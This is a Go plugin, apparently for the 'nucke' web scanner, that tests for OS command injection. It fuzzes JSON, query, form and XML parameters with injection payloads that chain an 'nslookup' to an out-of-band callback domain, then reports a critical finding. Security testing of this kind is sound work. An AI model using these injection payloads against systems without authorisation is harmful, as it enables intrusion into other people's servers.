package main

import (
    "net/http"
    "strings"
    "github.com/cfsdes/nucke/pkg/report"
    "github.com/cfsdes/nucke/pkg/plugins/fuzzers"
    "github.com/cfsdes/nucke/pkg/plugins/detections"
)


func Run(r *http.Request, client *http.Client, pluginDir string) (string, string, string, bool, error) {
    // Scan
    vulnFound, rawReq, url := scan(r, client)

    // Report
    reportContent := report.ReadFileToString("report-template.md", pluginDir)
    summary := report.ParseTemplate(reportContent, map[string]interface{}{
        "request": rawReq,
    })
    
    return	"Critical", url, summary, vulnFound, nil
}


// Running all Fuzzers
func scan(r *http.Request, client *http.Client) (bool, string, string) {
    
    // Format OOB URL
    hostParts := strings.Split(r.Host, ":")
    domain := hostParts[0]

    // Call All Fuzzers (Except fuzzHeaders)
    payloads := []string{
        ";nslookup "+domain+".{{.oob}}",
        "&nslookup "+domain+".{{.oob}}",
        "|nslookup "+domain+".{{.oob}}",
        "||nslookup "+domain+".{{.oob}}",
        "&&nslookup "+domain+".{{.oob}}",
        "`nslookup "+domain+".{{.oob}}`",
        "';nslookup "+domain+".{{.oob}};'",
    }
    matcher := detections.Matcher{OOB: true}

    fuzzers := []func(*http.Request, *http.Client, []string, detections.Matcher) (bool, string, string, string, string){
        fuzzers.FuzzJSON,
        fuzzers.FuzzQuery,
        fuzzers.FuzzFormData,
        fuzzers.FuzzXML,
    }

    for _, fuzzer := range fuzzers {
        if vulnFound, rawReq, url, _, _ := fuzzer(r, client, payloads, matcher); vulnFound {
            return vulnFound, rawReq, url
        }
    }

    return false, "", ""
}